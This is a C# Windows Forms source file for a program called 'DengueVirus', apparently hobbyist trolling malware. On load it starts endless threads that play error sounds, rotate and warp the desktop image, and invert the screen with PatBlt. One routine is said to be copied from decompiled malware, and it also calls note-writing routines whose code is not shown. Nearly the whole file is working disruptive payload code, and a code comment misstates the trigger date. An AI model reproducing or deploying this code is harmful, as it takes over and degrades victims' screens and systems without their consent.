using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DengueVirus.Spicy;

namespace DengueVirus
{
    public partial class Form1 : Form
    {
        // DLLs import thing, ignore it i guess.

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

        const int SRCCOPY = 0xCC0020; // idk why i put this here, too lazy to replace the var with the hex

        public Form1()
        {
            InitializeComponent();
        }

        public static void ErrorSounds()
        {
            Console.WriteLine("ErrorSounds");
            //int i = 0;
            for (; ; )
            {
                /*if (i > 1000)
                {
                    i = 0;
                }*/
                int num = new Random().Next(2);
                if (num != 0)
                {
                    if (num == 1)
                    {
                        SystemSounds.Hand.Play();
                    }
                }
                else
                {
                    SystemSounds.Exclamation.Play();
                }
                Thread.Sleep(400);
                //Thread.Sleep(1000-i);
                //i+=10;
            }
        }
        public static void ShakeMouse()
        {
            // gets mouse pointer and shakes in both x & y directions
            Console.WriteLine("ShakeMouse");

            // get cursor
            Cursor c = new Cursor(Cursor.Current.Handle);

            for (; ; )
            {
                // change its xy pos
                int i;
                for (i = 0; i < 100; i++)
                {
                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);
                }
                // reset i var and run again
                i = 0;
            }

        }
        public static void PrintRotate()
        {
            int num = 0;
            for (; ; )
            {
                IntPtr dc = GetDC(IntPtr.Zero);
                Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics graphics = Graphics.FromImage(image);
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                graphics = Graphics.FromHdc(dc);
                if (num < 9)
                {
                    graphics.RotateTransform((float)(num * 4));//(float)(num * 10));
                    //graphics.DrawBezier(new Pen(Color.Red, 2f), 0, 0, 100, 100, 200, 200, 300, 300);
                    graphics.DrawImage(image, 0, 0);
                }
                else
                {
                    graphics.RotateTransform(-90f);
                    num = 0;
                }
                num++;
                //Thread.Sleep(20);
            }
        }

        static void Wave()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            Random rand = new Random();

            int v7 = GetSystemMetrics(1);
            int v6 = GetSystemMetrics(0);

            int xD = -100;
            while (true)
            {
                int y = rand.Next(v7);
                int v4 = rand.Next(5);

                if (v4 == 1)
                { BitBlt(hdc, 0, y, v6, xD, hdc, xD, y, SRCCOPY); }
                else
                { BitBlt(hdc, 1, y, v6, xD, hdc, xD, y, SRCCOPY); }
                if (xD < 100) { xD++; } else { xD = -100; }
            }
        }

        static void PatBltpayload()
        {
            // Stolen from Solaris, kinda generic payload
            // its just an invertscreen pl so i guess its fine
            // to reuse, and it generates some cool artifacts along with
            // the moving screen payload (Wave())

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                Random rand = new Random();
                int v4 = rand.Next();
                IntPtr v5 = new IntPtr(v4 % 40); // Strings are strange since it was decompiled, not the original source code
                SelectObject(hdc, v5);
                PatBlt(hdc, 0, 0, w, h, 0x005A0049);
                //Thread.Sleep(10);
            }
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            //if the date is 1st of any month
            if (DateTime.Now.Day == 10)
            {
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
                Thread.Sleep(1000);
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.AppStarting;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
            }

            SpicyPL.WriteNote();

            Thread.Sleep(7000);

            Thread t = new Thread(ErrorSounds); t.Start();

            Thread.Sleep(10000);

            SpicyPL.UserNote();

            //t.Abort();

            //Thread t2 = new Thread(ShakeMouse);t2.Start();
            //Thread.Sleep(10000);

            Thread t3 = new Thread(PrintRotate); t3.Start();
            Thread t4 = new Thread(Wave); t4.Start();
            Thread.Sleep(5000);
            Thread t5 = new Thread(PatBltpayload); t5.Start();

            //close form
            //this.Close();

        }
    }
}
